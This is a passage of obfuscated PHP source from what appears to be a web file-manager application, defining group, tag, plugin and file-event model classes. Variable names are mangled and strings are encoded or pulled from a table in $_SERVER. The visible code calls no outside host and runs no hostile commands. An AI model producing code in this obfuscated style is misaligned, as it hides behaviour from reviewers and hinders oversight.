array_reverse($şôùÎë)) . $½—ù†¸Ò[50]; $this->setNamePinyin($§¸Æøé¬[$šñúÁ¥], $§¸Æøé¬[$½—ù†¸Ò[32]]); $this->where(array($šñúÁ¥ => $§¸Æøé¬[$šñúÁ¥]))->save(array($½—ù†¸Ò[666] => $şôùÎë)); } return $½†­†æ; } public function groupNameAuto($÷·ú±”, $™Ú†åÍØ) { $Çˆ‰ÃÈ¬ =& $_SERVER[´È¥ö†ö]; $½Ÿ§¥° = $this->where(array($Çˆ‰ÃÈ¬[488] => $÷·ú±”))->getField($Çˆ‰ÃÈ¬[32], !0); if (!$½Ÿ§¥° || !in_array($™Ú†åÍØ, $½Ÿ§¥°)) { return $™Ú†åÍØ; } for ($¥‹ÅµÌ· = 1; $¥‹ÅµÌ· <= count($½Ÿ§¥°) + 1; $¥‹ÅµÌ·++) { $ÖŞ¾¼ó = $™Ú†åÍØ . "\50{$¥‹ÅµÌ·}\x29"; if (!in_array($ÖŞ¾¼ó, $½Ÿ§¥°)) { return $ÖŞ¾¼ó; } } } public function groupSwitch($öÌ¼Åš¨, $ì«—ı) { $çÕõ§Ò˜ =& $_SERVER[´È¥ö†ö]; $á©ˆÄÛÏ = array($çÕõ§Ò˜[1974] => array($çÕõ§Ò˜[7], array($öÌ¼Åš¨, $ì«—ı))); $Æõğ“³ = $this->where($á©ˆÄÛÏ)->select(); $Æõğ“³ = array_to_keyvalue($Æõğ“³, $çÕõ§Ò˜[1974]); if (!isset($Æõğ“³[$öÌ¼Åš¨]) || !isset($Æõğ“³[$ì«—ı]) || $Æõğ“³[$öÌ¼Åš¨][$çÕõ§Ò˜[192]] == 0) { return !1; } $á©ˆÄÛÏ = array($çÕõ§Ò˜[1974] => $öÌ¼Åš¨); $±âöè”à = Model($çÕõ§Ò˜[2068])->where($á©ˆÄÛÏ)->select(); if (!$±âöè”à) { $±âöè”à = array(); } foreach ($±âöè”à as $„¦îĞ½ğ) { $©÷÷–Áü = $„¦îĞ½ğ[$çÕõ§Ò˜[1773]]; $á©ˆÄÛÏ = array($çÕõ§Ò˜[1773] => $©÷÷–Áü, $çÕõ§Ò˜[1974] => $ì«—ı); $Æ öˆïÆ = Model($çÕõ§Ò˜[2068])->where($á©ˆÄÛÏ)->find(); if (!$Æ öˆïÆ) { $ìæÃÍ’Ì = array($ì«—ı => $„¦îĞ½ğ[$çÕõ§Ò˜[2082]]); Model($çÕõ§Ò˜[608])->userGroupAdd($©÷÷–Áü, $ìæÃÍ’Ì); } Model($çÕõ§Ò˜[608])->userGroupRemove($©÷÷–Áü, $öÌ¼Åš¨); } $á©ˆÄÛÏ = array($çÕõ§Ò˜[190] => 2, $çÕõ§Ò˜[192] => 0, $çÕõ§Ò˜[496] => 1, $çÕõ§Ò˜[580] => array($çÕõ§Ò˜[7], array($öÌ¼Åš¨, $ì«—ı))); $üÎÁ·ôŞ = Model($çÕõ§Ò˜[901])->where($á©ˆÄÛÏ)->field($çÕõ§Ò˜[2083])->select(); $üÎÁ·ôŞ = array_to_keyvalue($üÎÁ·ôŞ, $çÕõ§Ò˜[580], $çÕõ§Ò˜[193]); $×ÁöÏ¡ø = !empty($üÎÁ·ôŞ[$öÌ¼Åš¨]) ? $üÎÁ·ôŞ[$öÌ¼Åš¨] : !1; if ($×ÁöÏ¡ø) { if (!$üÎÁ·ôŞ[$ì«—ı]) { $üÎÁ·ôŞ[$ì«—ı] = Model($çÕõ§Ò˜[901])->groupRootAdd($ì«—ı); } $¼ÃÔÆ¤Ó = $üÎÁ·ôŞ[$ì«—ı]; $á©ˆÄÛÏ = array($çÕõ§Ò˜[192] => $×ÁöÏ¡ø); $üÎÁ·ôŞ = Model($çÕõ§Ò˜[901])->where($á©ˆÄÛÏ)->field($çÕõ§Ò˜[2084])->select(); if (!$üÎÁ·ôŞ) { $üÎÁ·ôŞ = array(); } Model($çÕõ§Ò˜[901])->moveClearAuth = !1; foreach ($üÎÁ·ôŞ as $³ß›ÌŸ) { $ÒøœıÎ­ = $³ß›ÌŸ[$çÕõ§Ò˜[496]] == $çÕõ§Ò˜[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($çÕõ§Ò˜[901])->move($³ß›ÌŸ[$çÕõ§Ò˜[193]], $¼ÃÔÆ¤Ó, $ÒøœıÎ­); } Model($çÕõ§Ò˜[901])->moveClearAuth = !0; $á©ˆÄÛÏ = array($çÕõ§Ò˜[190] => 2, $çÕõ§Ò˜[580] => $öÌ¼Åš¨); $¢ÎèñÅ = array($çÕõ§Ò˜[580] => $ì«—ı); Model($çÕõ§Ò˜[2085])->where($á©ˆÄÛÏ)->save($¢ÎèñÅ); Model($çÕõ§Ò˜[2086])->where($á©ˆÄÛÏ)->save($¢ÎèñÅ); } $this->_changeChildLevel($Æõğ“³[$öÌ¼Åš¨], $Æõğ“³[$ì«—ı], !0); $this->where(array($çÕõ§Ò˜[192] => $öÌ¼Åš¨))->save(array($çÕõ§Ò˜[192] => $ì«—ı)); $this->_clearChildrenCache($Æõğ“³[$ì«—ı]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($Ù“ä®ä©) { $Å¸¤—´… =& $_SERVER[´È¥ö†ö]; return array($Å¸¤—´…[2087] => array($Ù“ä®ä©[0], $Å¸¤—´…[2088]), $Å¸¤—´…[2089] => array($Ù“ä®ä©[0], $Å¸¤—´…[2090])); } protected function get($äªŸ¯ò) { $õºÎéÀ³ =& $_SERVER[´È¥ö†ö]; $¦¨ƒõœâ = Model($õºÎéÀ³[596])->metaGet($äªŸ¯ò, $õºÎéÀ³[2091]); $ƒÉøó°ş = json_decode($¦¨ƒõœâ, !0); return $ƒÉøó°ş ? $ƒÉøó°ş : array($õºÎéÀ³[2092] => $õºÎéÀ³[91], $õºÎéÀ³[456] => array()); } protected function set($úåÆ¥·–, $š‹µ»Ò’) { $³Â¬ŞÓ¦ =& $_SERVER[´È¥ö†ö]; $š‹µ»Ò’ = $š‹µ»Ò’ ? $š‹µ»Ò’ : array($³Â¬ŞÓ¦[2092] => $³Â¬ŞÓ¦[91], $³Â¬ŞÓ¦[456] => array()); return Model($³Â¬ŞÓ¦[596])->metaSet($úåÆ¥·–, $³Â¬ŞÓ¦[2091], json_encode($š‹µ»Ò’)); } protected function getByTagID($úŒß‡õ, $ÏÛè¡˜›) { $è¸·©Ëä =& $_SERVER[´È¥ö†ö]; if (!$úŒß‡õ || !$ÏÛè¡˜›) { return !1; } if (!Model($è¸·©Ëä[596])->getInfoSimple($úŒß‡õ)) { return !1; } $‰ˆÛû‰™ = $this->get($úŒß‡õ); if (!$‰ˆÛû‰™ || !isset($‰ˆÛû‰™[$è¸·©Ëä[456]])) { return !1; } $îâ«¯Ã = array_find_by_field($‰ˆÛû‰™[$è¸·©Ëä[456]], $è¸·©Ëä[486], $ÏÛè¡˜›); return is_array($îâ«¯Ã) ? $îâ«¯Ã : !1; } public function listSource($ü°ºå’ı, $»ôµõ×ş) { $ãæÜúØ· =& $_SERVER[´È¥ö†ö]; if ($»ôµõ×ş && !is_array($»ôµõ×ş)) { $»ôµõ×ş = array($»ôµõ×ş); } $¡ğÀµ¯¶ = $this->listData($ü°ºå’ı); $ÚÛ•´’Ó = array(); foreach ($¡ğÀµ¯¶ as $ÔÎ¿Ò¨×) { $¥½ÎªÍÉ = $ÔÎ¿Ò¨×[$ãæÜúØ·[87]]; if (!$¥½ÎªÍÉ) { continue; } if (!isset($ÚÛ•´’Ó[$¥½ÎªÍÉ])) { $ÚÛ•´’Ó[$¥½ÎªÍÉ] = array(); } $ÚÛ•´’Ó[$¥½ÎªÍÉ][] = $ÔÎ¿Ò¨×[$ãæÜúØ·[511]]; } $ÛºÈ‚İ = array(); foreach ($ÚÛ•´’Ó as $¢»½‹ù• => $ò™³–) { $ÀËíù = !0; if (!$»ôµõ×ş) { $ÛºÈ‚İ[] = $¢»½‹ù•; continue; } foreach ($»ôµõ×ş as $œê¸¥À­) { if (!in_array($œê¸¥À­, $ò™³–)) { $ÀËíù = !1; break; } } if ($ÀËíù) { $ÛºÈ‚İ[] = $¢»½‹ù•; } } if (!$ÛºÈ‚İ) { return array(); } $ÎÚùŠàå = array($ãæÜúØ·[502] => array($ãæÜúØ·[503], $ÛºÈ‚İ), $ãæÜúØ·[580] => $ü°ºå’ı, $ãæÜúØ·[190] => SourceModel::TYPE_GROUP); $ÁÊŠ¬ ´ = Model($ãæÜúØ·[1420])->listSource($ÎÚùŠàå); if (!$ÁÊŠ¬ ´ || count($ÛºÈ‚İ) == $ÁÊŠ¬ ´[$ãæÜúØ·[453]][$ãæÜúØ·[454]]) { return $ÁÊŠ¬ ´; } $Ë¤Œóğ  = array(); $òá¿´¶– = array_to_keyvalue($ÁÊŠ¬ ´[$ãæÜúØ·[85]], $ãæÜúØ·[12], $ãæÜúØ·[193]); $µÃêøú = array_to_keyvalue($ÁÊŠ¬ ´[$ãæÜúØ·[86]], $ãæÜúØ·[12], $ãæÜúØ·[193]); $ÁˆÂÄÆß = array_merge($µÃêøú, $òá¿´¶–); foreach ($ÛºÈ‚İ as $¥½ÎªÍÉ) { if (!in_array($¥½ÎªÍÉ, $ÁˆÂÄÆß)) { $Ë¤Œóğ [] = $¥½ÎªÍÉ; } } if ($Ë¤Œóğ ) { $this->removeBySource($ü°ºå’ı, $Ë¤Œóğ ); } return $ÁÊŠ¬ ´; } protected function listData($¨Œ­ÆŞª) { $óñª“ï– =& $_SERVER[´È¥ö†ö]; $™ãÕŒ‡Ğ = array($óñª“ï–[1764] => 0, $óñª“ï–[568] => array($óñª“ï–[2093], 0), $óñª“ï–[507] => $óñª“ï–[2094] . $¨Œ­ÆŞª); $‘Ú¦ˆ“ = $óñª“ï–[2095]; $³Şª®  = $this->field($‘Ú¦ˆ“)->where($™ãÕŒ‡Ğ)->order($óñª“ï–[2096])->select(); return $³Şª®  ? $³Şª®  : array(); } protected function addToTag($’Ì´ùË‹, $¶ÒÜ±Š¦, $‚¦‡„‹Ï) { $†§ÕèÕ =& $_SERVER[´È¥ö†ö]; if (!$this->getByTagID($’Ì´ùË‹, $‚¦‡„‹Ï) || !$¶ÒÜ±Š¦) { return !1; } if (!Model($†§ÕèÕ[901])->pathInfo($¶ÒÜ±Š¦)) { return !1; } $æŒúÏîø = array($†§ÕèÕ[1764] => 0, $†§ÕèÕ[568] => $‚¦‡„‹Ï, $†§ÕèÕ[506] => $¶ÒÜ±Š¦, $†§ÕèÕ[507] => $†§ÕèÕ[2097] . $’Ì´ùË‹, $†§ÕèÕ[505] => $†§ÕèÕ[12], $†§ÕèÕ[1978] => 0); if ($this->where($æŒúÏîø)->find()) { return !1; } return $this->add($æŒúÏîø); } protected function removeFromTag($ëµËÃşÄ, $Óæ’ú¢½, $ÔãÚ) { $ğ¡ä€Ö =& $_SERVER[´È¥ö†ö]; if (!$this->getByTagID($ëµËÃşÄ, $ÔãÚ) || !$Óæ’ú¢½) { return !1; } if (is_array($Óæ’ú¢½)) { $Óæ’ú¢½ = array($ğ¡ä€Ö[7], $Óæ’ú¢½); } $—ôÏ÷ôó = array($ğ¡ä€Ö[1764] => 0, $ğ¡ä€Ö[568] => $ÔãÚ, $ğ¡ä€Ö[507] => $ğ¡ä€Ö[2097] . $ëµËÃşÄ, $ğ¡ä€Ö[506] => $Óæ’ú¢½); return $this->where($—ôÏ÷ôó)->delete(); } protected function removeByTag($¢¾¾“ûó, $•¡âğÖó) { $ì”ß£Üò =& $_SERVER[´È¥ö†ö]; if (!$this->getByTagID($¢¾¾“ûó, $•¡âğÖó)) { return !1; } $Ë“¥Ü»ø = array($ì”ß£Üò[1764] => 0, $ì”ß£Üò[568] => $•¡âğÖó, $ì”ß£Üò[507] => $ì”ß£Üò[2097] . $¢¾¾“ûó); return $this->where($Ë“¥Ü»ø)->delete(); } protected function removeBySource($‹êĞö«, $ªË©¬Ìğ) { $ùË Ã™á =& $_SERVER[´È¥ö†ö]; if (!$‹êĞö« || !$ªË©¬Ìğ) { return !1; } if (is_array($ªË©¬Ìğ)) { $ªË©¬Ìğ = array($ùË Ã™á[7], $ªË©¬Ìğ); } $¶¿€¡ğü = array($ùË Ã™á[1764] => 0, $ùË Ã™á[506] => $ªË©¬Ìğ, $ùË Ã™á[568] => array($ùË Ã™á[1090], 0), $ùË Ã™á[507] => $ùË Ã™á[2097] . $‹êĞö«); return $this->where($¶¿€¡ğü)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\160\x6c\x75\x67\x69\x6e\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\145", "\x73\164\x61\x74\x75\163", "\162\x65\x67\151\145\163\164", "\143\157\156\146\x69\147"); public function loadList($ô©‘ˆÉá = false) { $º—¦ãÛ = array_to_keyvalue($this->listData(), $_SERVER[´È¥ö†ö][32]); if ($ô©‘ˆÉá) { return $º—¦ãÛ[$ô©‘ˆÉá]; } return $º—¦ãÛ; } public function init() { $İšâÆŞŒ =& $_SERVER[´È¥ö†ö]; Hook::trigger($İšâÆŞŒ[2098]); $ıàşÀëÙ = $this->loadPluginList(); foreach ($ıàşÀëÙ as $İÙ§×í => $Ñî›¾š½) { $äÜÁ­ú = $this->appAllow($İÙ§×í, $Ñî›¾š½); if (!$äÜÁ­ú) { continue; } foreach ($Ñî›¾š½[$İšâÆŞŒ[2099]] as $ø¢Óä¨Ÿ => $í¼Ê¬ñ†) { Hook::bind($ø¢Óä¨Ÿ, $í¼Ê¬ñ†); } } Hook::trigger($İšâÆŞŒ[2100]); Hook::trigger(ACTION); } public function appAllow($¹—¾šÏê, $‚òÇç™¿, $ÕŸ¸ÀÜ§ = true) { $•Âæöòö =& $_SERVER[´È¥ö†ö]; $” Õö¡ƒ = PLUGIN_DIR . $¹—¾šÏê . $•Âæöòö[2101]; if (!is_array($‚òÇç™¿) || !is_array($‚òÇç™¿[$•Âæöòö[2099]]) || $‚òÇç™¿[$•Âæöòö[826]] != 1 || !is_file($” Õö¡ƒ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$•Âæöòö[6]][$•Âæöòö[2102]] || !$GLOBALS[$•Âæöòö[6]][$•Âæöòö[2103]]) { return !0; } $Ô±Î²Ê = explode($•Âæöòö[50], strtolower($GLOBALS[$•Âæöòö[6]][$•Âæöòö[2103]])); return in_array(strtolower($¹—¾šÏê), $Ô±Î²Ê) ? !1 : !0; } if ($ÕŸ¸ÀÜ§ && !Action($•Âæöòö[2104])->checkAuth($¹—¾šÏê)) { return !1; } return !0; } public function unInstall($®–­šï¾) { $×„”¬¼Â =& $_SERVER[´È¥ö†ö]; $‚¿‹™Şæ = $this->loadList($®–­šï¾); if (file_exists(PLUGIN_DIR . $®–­šï¾)) { Hook::apply($®–­šï¾ . $×„”¬¼Â[2105]); } $this->remove($‚¿‹™Şæ[$×„”¬¼Â[486]]); } public function changeStatus($Íà¬Ô, $®·­Ÿ½â) { $†€™Òœµ =& $_SERVER[´È¥ö†ö]; $²„ŠîŠ´ = $this->loadList($Íà¬Ô); if ($®·­Ÿ½â) { Hook::apply($Íà¬Ô . $†€™Òœµ[2106]); } $this->update($²„ŠîŠ´[$†€™Òœµ[486]], array($†€™Òœµ[2107] => $®·­Ÿ½â)); } public function appRegist($ãˆŒÉŞÃ, $ë®È“åı) { $È¤åé«ê =& $_SERVER[´È¥ö†ö]; $ş°©ğöğ = $this->loadList($ãˆŒÉŞÃ); if ($ş°©ğöğ) { $this->update($ş°©ğöğ[$È¤åé«ê[486]], array($È¤åé«ê[2099] => $ë®È“åı)); } else { $º˜¡ûÔ = array($È¤åé«ê[32] => $ãˆŒÉŞÃ, $È¤åé«ê[2099] => $ë®È“åı, $È¤åé«ê[826] => 0, $È¤åé«ê[6] => $this->getConfigDefault($ãˆŒÉŞÃ)); $this->insert($º˜¡ûÔ); } } public function getConfigDefault($ÌÂÒ­) { $Ø€ıò± =& $_SERVER[´È¥ö†ö]; $Ô©¥¿ŠŞ = array(); $íùÕ§ˆù = $this->getPackageJson($ÌÂÒ­); if (!$íùÕ§ˆù && is_array($íùÕ§ˆù[$Ø€ıò±[2108]])) { return $Ô©¥¿ŠŞ; } foreach ($íùÕ§ˆù[$Ø€ıò±[2108]] as $µ»¬†Ö => $É¥ŒÁ¬û) { if (!isset($É¥ŒÁ¬û[$Ø€ıò±[461]]) || isset($Ô©¥¿ŠŞ[$µ»¬†Ö])) { continue; } $Ô©¥¿ŠŞ[$µ»¬†Ö] = $É¥ŒÁ¬û[$Ø€ıò±[461]]; } return $Ô©¥¿ŠŞ; } public function getPackageJson($òî¸ü—®) { return Hook::apply($òî¸ü—® . $_SERVER[´È¥ö†ö][2109]); } public function getConfig($ÕĞ“Â¥ù, $ƒêĞÌÍ‘ = false) { $†ŠÊ¬•ı =& $_SERVER[´È¥ö†ö]; $…€ÇÈø´ = array(); $ª«ïÍæ¾ = $this->loadList($ÕĞ“Â¥ù); if ($ª«ïÍæ¾ && is_array($ª«ïÍæ¾[$†ŠÊ¬•ı[6]])) { $…€ÇÈø´ = $ª«ïÍæ¾[$†ŠÊ¬•ı[6]]; } if (!$…€ÇÈø´ || $ƒêĞÌÍ‘) { $…€ÇÈø´ = $this->getConfigDefault($ÕĞ“Â¥ù); } return $…€ÇÈø´; } public function setConfig($ÕñŒµ—“, $ÓóÛ—´Î = false) { $ùÔš°¤› =& $_SERVER[´È¥ö†ö]; $¹É‰æ€å = $this->loadList($ÕñŒµ—“); if (!$¹É‰æ€å) { return !1; } $Á×¥¤É˜ = $¹É‰æ€å[$ùÔš°¤›[6]]; if ($ÓóÛ—´Î == !1) { $Á×¥¤É˜ = array(); $ÓóÛ—´Î = $this->getConfigDefault($ÕñŒµ—“); } foreach ($ÓóÛ—´Î as $¥Õ¤Îö => $½ê¨¿Ü) { $Á×¥¤É˜[$¥Õ¤Îö] = is_string($½ê¨¿Ü) ? trim($½ê¨¿Ü) : $½ê¨¿Ü; } $this->update($¹É‰æ€å[$ùÔš°¤›[486]], array($ùÔš°¤›[6] => $Á×¥¤É˜)); } public function viewList() { $Í·ËÏöÈ =& $_SERVER[´È¥ö†ö]; $ûÛ×üÛÙ = $this->loadList(); $this->pluginScan($ûÛ×üÛÙ); $ûÛ×üÛÙ = $this->loadPluginList(); $ÄÃÅ†” = array(); foreach ($ûÛ×üÛÙ as $îÊ—æà’ => $¶×ò‰û) { $Òé‰„è = $¶×ò‰û; unset($¶×ò‰û[$Í·ËÏöÈ[2099]], $¶×ò‰û[$Í·ËÏöÈ[6]]); $‹ò‚æèª = PLUGIN_DIR . $¶×ò‰û[$Í·ËÏöÈ[32]] . $Í·ËÏöÈ[2101]; if (!is_file($‹ò‚æèª)) { continue; } $ş¾²˜õˆ = Hook::apply($¶×ò‰û[$Í·ËÏöÈ[32]] . $Í·ËÏöÈ[2109]); if (!is_array($ş¾²˜õˆ)) { continue; } $ÄÃÅ†”[$îÊ—æà’] = array_merge($¶×ò‰û, $ş¾²˜õˆ); if ($Òé‰„è[$Í·ËÏöÈ[6]][$Í·ËÏöÈ[1684]] != $ş¾²˜õˆ[$Í·ËÏöÈ[1658]]) { Hook::apply($¶×ò‰û[$Í·ËÏöÈ[32]] . $Í·ËÏöÈ[2106]); $Òé‰„è[$Í·ËÏöÈ[6]][$Í·ËÏöÈ[1684]] = $ş¾²˜õˆ[$Í·ËÏöÈ[1658]]; $this->update($¶×ò‰û[$Í·ËÏöÈ[486]], array($Í·ËÏöÈ[6] => $Òé‰„è[$Í·ËÏöÈ[6]])); } } return $ÄÃÅ†”; } private function loadPluginList() { $‘–”‰¥ì =& $_SERVER[´È¥ö†ö]; $˜¤°Îî¹ = $this->loadList(); if (strtolower(MOD) == $‘–”‰¥ì[2110]) { return $˜¤°Îî¹; } $í°¹¢š‚ = Hook::trigger($‘–”‰¥ì[2111], $˜¤°Îî¹); if ($˜¤°Îî¹ && !$í°¹¢š‚) { die; } return $í°¹¢š‚ ? $í°¹¢š‚ : $˜¤°Îî¹; } private function pluginScan($æ¹—‰šé) { $—åèÓôÔ =& $_SERVER[´È¥ö†ö]; recursion_dir(PLUGIN_DIR, $¬ä€ç‡…, $¢“•³Í, 0); foreach ($¬ä€ç‡… as $Š›®ÆÉş) { $©”Ş£™­ = get_path_this($Š›®ÆÉş); if (isset($æ¹—‰šé[$©”Ş£™­]) || !file_exists($Š›®ÆÉş . $—åèÓôÔ[2112]) || !file_exists($Š›®ÆÉş . $—åèÓôÔ[2101])) { continue; } Hook::apply($©”Ş£™­ . $—åèÓôÔ[2106]); } } } goto E¢‹Š‹°ÈŞ; AŸ¢â•³ÚÀ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\143\145\137\145\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\x54\x69\x6d\x65", "\164\x69\155\145", "\x69\156\x73\145\x72\164", "\x66\165\x6e\143\164\x69\157\156"), array("\144\x65\x73\143", '', "\x69\x6e\163\x65\x72\164\54\x75\x70\x64\x61\164\145\54\x73\145\x6c\x65\x63\164", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ËºÃö»¥, $ÇÉ´¨â, $÷„îö = '') { $Ä˜Ï×® =& $_SERVER[´È¥ö†ö]; if (!$this->eventSave) { return; } $¥ãŒ¼Ş = Model($Ä˜Ï×®[1420])->sourceInfo($ËºÃö»¥); if (!$¥ãŒ¼Ş) { return !1; } if ($this->isDisableEvent($¥ãŒ¼Ş, $ÇÉ´¨â)) { return; } if ($÷„îö && is_string($÷„îö)) { $÷„îö = array($Ä˜Ï×®[2013] => $÷„îö); } $Îï¹œÅû = defined($Ä˜Ï×®[2201]) ? USER_ID : 0; $ğÜ‹ÔÕ = array($Ä˜Ï×®[502] => $ËºÃö»¥, $Ä˜Ï×®[2202] => $¥ãŒ¼Ş[$Ä˜Ï×®[192]], $Ä˜Ï×®[2203] => $¥ãŒ¼Ş[$Ä˜Ï×®[32]], $Ä˜Ï×®[593] => !empty($¥ãŒ¼Ş[$Ä˜Ï×®[593]]) ? $¥ãŒ¼Ş[$Ä˜Ï×®[593]] : $Ä˜Ï×®[12], $Ä˜Ï×®[1764] => $Îï¹œÅû, $Ä˜Ï×®[507] => $ÇÉ´¨â, $Ä˜Ï×®[1766] => $÷„îö); $this->addSystemLog($ÇÉ´¨â, $ğÜ‹ÔÕ); unset($ğÜ‹ÔÕ[$Ä˜Ï×®[2203]], $ğÜ‹ÔÕ[$Ä˜Ï×®[593]]); return $this->add($ğÜ‹ÔÕ); } private function addSystemLog($Ù‡›ËÊ, $¨àŞ„Áç) { $¹Ææª–û =& $_SERVER[´È¥ö†ö]; if ($Ù‡›ËÊ == $¹Ææª–û[2204]) { $Ù‡›ËÊ = $¨àŞ„Áç[$¹Ææª–û[537]][$¹Ææª–û[2205]]; } else { if (in_array($Ù‡›ËÊ, array($¹Ææª–û[1953], $¹Ææª–û[2206]))) { $Ù‡›ËÊ = $¨àŞ„Áç[$¹Ææª–û[537]][$¹Ææª–û[171]]; } } $Üè«Ñˆ = array_merge($¨àŞ„Áç, array($¹Ææª–û[2207] => $¨àŞ„Áç[$¹Ææª–û[193]], $¹Ææª–û[2208] => $¨àŞ„Áç[$¹Ææª–û[2208]])); Hook::trigger($¹Ææª–û[2209], $¹Ææª–û[2210] . $Ù‡›ËÊ, $¨àŞ„Áç); Model($¹Ææª–û[1917])->addLog($¹Ææª–û[2210] . $Ù‡›ËÊ, $Üè«Ñˆ); } private function isDisableEvent($ êŞ„şò, $ªåæÇ•ë) { $İ¦Å·³Æ =& $_SERVER[´È¥ö†ö]; if ($ êŞ„şò[$İ¦Å·³Æ[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ªåæÇ•ë == $İ¦Å·³Æ[1942]) { return !1; } return !0; } public function eventCreate($µßªœŒ‹, $•¡¦™­) { $¶Š¦ŠÄº =& $_SERVER[´È¥ö†ö]; $í›Ûò² = Model($¶Š¦ŠÄº[1420])->sourceInfo($µßªœŒ‹); $Òşº“†´ = array($¶Š¦ŠÄº[2205] => $•¡¦™­, $¶Š¦ŠÄº[32] => $í›Ûò²[$¶Š¦ŠÄº[32]]); return $this->addEvent($µßªœŒ‹, $¶Š¦ŠÄº[2204], $Òşº“†´); } public function eventFileEdit($ı¾”ØĞ) { $æ´‹·É‡ =& $_SERVER[´È¥ö†ö]; $»¶Ø¬‚Ï = array($æ´‹·É‡[2211] => $_SERVER[$æ´‹·É‡[2212]], $æ´‹·É‡[2213] => strtolower(ACTION)); if (isset($GLOBALS[$æ´‹·É‡[7]][$æ´‹·É‡[2214]])) { $»¶Ø¬‚Ï[$æ´‹·É‡[2214]] = $æ´‹·É‡[91]; } return $this->addEvent($ı¾”ØĞ, $æ´‹·É‡[1943], $»¶Ø¬‚Ï); } public function eventRecycle($òƒ›ÏÜË, $‡À«åÉ¾) { return $this->addEvent($òƒ›ÏÜË, $_SERVER[´È¥ö†ö][2206], $‡À«åÉ¾); } private static $_removeLast = ''; public function eventRemove($êùê¹ç) { $˜ä¤›ã =& $_SERVER[´È¥ö†ö]; self::$_removeLast = $êùê¹ç; $òüÖ°ôâ = Model($˜ä¤›ã[1420])->sourceInfo($êùê¹ç); $¸é¾Ñ¾… = array_field_key($òüÖ°ôâ, array($˜ä¤›ã[193], $˜ä¤›ã[552], $˜ä¤›ã[516], $˜ä¤›ã[595])); $àÅÍ »Ş = array($˜ä¤›ã[171] => $òüÖ°ôâ[$˜ä¤›ã[32]], $˜ä¤›ã[2213] => ACTION, $˜ä¤›ã[2215] => $¸é¾Ñ¾…); return $this->addEvent($òüÖ°ôâ[$˜ä¤›ã[192]], $˜ä¤›ã[1942], $àÅÍ »Ş); } public function eventShare($Ö…ÆùË£, $¤şÃŒĞâ) { return $this->addEvent($Ö…ÆùË£, $_SERVER[´È¥ö†ö][1953], $¤şÃŒĞâ); } public function eventMove($€£´æ«, $òøöóé», $é‹¸¿¯) { $Ïé§ï¨ã =& $_SERVER[´È¥ö†ö]; if (self::$_removeLast == $€£´æ«) { return; } $‚Ğ¼ÅÅ = Model($Ïé§ï¨ã[1420]); $ìÙ«¥†÷ = $‚Ğ¼ÅÅ->sourceInfo($€£´æ«); $É¾ß¯–ó = $‚Ğ¼ÅÅ->sourceInfo($òøöóé»); $œğªËÓÆ = $‚Ğ¼ÅÅ->sourceInfo($é‹¸¿¯); $¹²¼Ôí² = array($Ïé§ï¨ã[1240] => $òøöóé», $Ïé§ï¨ã[2216] => $É¾ß¯–ó[$Ïé§ï¨ã[32]], $Ïé§ï¨ã[2192] => !empty($É¾ß¯–ó[$Ïé§ï¨ã[593]]) ? $É¾ß¯–ó[$Ïé§ï¨ã[593]] : $Ïé§ï¨ã[12], $Ïé§ï¨ã[1241] => $é‹¸¿¯, $Ïé§ï¨ã[2217] => $œğªËÓÆ[$Ïé§ï¨ã[32]], $Ïé§ï¨ã[2218] => !empty($œğªËÓÆ[$Ïé§ï¨ã[593]]) ? $œğªËÓÆ[$Ïé§ï¨ã[593]] : $Ïé§ï¨ã[12]); $this->addEvent($€£´æ«, $Ïé§ï¨ã[634], $¹²¼Ôí²); $ìÙ«¥†÷ = $‚Ğ¼ÅÅ->sourceInfo($€£´æ«); $¹²¼Ôí² = array($Ïé§ï¨ã[193] => $ìÙ«¥†÷[$Ïé§ï¨ã[193]], $Ïé§ï¨ã[32] => $ìÙ«¥†÷[$Ïé§ï¨ã[32]]); $this->addEvent($òøöóé», $Ïé§ï¨ã[2219], $¹²¼Ôí²); } public function eventCopy($ÚÃÕäè†) { $this->eventCreate($ÚÃÕäè†, $_SERVER[´È¥ö†ö][632]); } public function eventRename($’­ÍÑİ‡, $ Œà£„¦, $¦‡Èä–) { $Æç¸‰Øö =& $_SERVER[´È¥ö†ö]; $úıÔ  = array($Æç¸‰Øö[1240] => $ Œà£„¦, $Æç¸‰Øö[1241] => $¦‡Èä–); return $this->addEvent($’­ÍÑİ‡, $Æç¸‰Øö[1434], $úıÔ ); } public function eventAddComment($—°ù–×, $Á›ŠˆºÎ) { return $this->addEvent($—°ù–×, $_SERVER[´È¥ö†ö][2220], $Á›ŠˆºÎ); } public function eventAddDesc($Íì“©¯ù, $šÒî‰Ô³) { return $this->addEvent($Íì“©¯ù, $_SERVER[´È¥ö†ö][2221], $šÒî‰Ô³); } public function listBySource($¿Õ—ÅÛİ) { $Úò¦£›³ =& $_SERVER[´È¥ö†ö]; $Öñê¿Ü = Model($Úò¦£›³[1420])->sourceInfo($¿Õ—ÅÛİ); $”ŞÇÁ‹Ş = array($Úò¦£›³[502] => $¿Õ—ÅÛİ); if ($Öñê¿Ü[$Úò¦£›³[496]] == $Úò¦£›³[91]) { $ôéŒÆ‘û = Model($Úò¦£›³[1420])->listSearchChildren($¿Õ—ÅÛİ, 20000); $ôéŒÆ‘û[] = $¿Õ—ÅÛİ . $Úò¦£›³[465]; $”ŞÇÁ‹Ş = array($Úò¦£›³[193] => array($Úò¦£›³[7], $ôéŒÆ‘û)); } $Ù®ÁØ = $this->where($”ŞÇÁ‹Ş)->order($Úò¦£›³[2222])->selectPage(); if ($Ù®ÁØ[$Úò¦£›³[453]][$Úò¦£›³[454]] == 0) { $Ù®ÁØ[$Úò¦£›³[453]][$Úò¦£›³[454]] = 1; $Ù®ÁØ[$Úò¦£›³[456]] = array(array($Úò¦£›³[502] => $¿Õ—ÅÛİ, $Úò¦£›³[2202] => $Öñê¿Ü[$Úò¦£›³[192]], $Úò¦£›³[1764] => $Öñê¿Ü[$Úò¦£›³[538]], $Úò¦£›³[507] => $Úò¦£›³[2223], 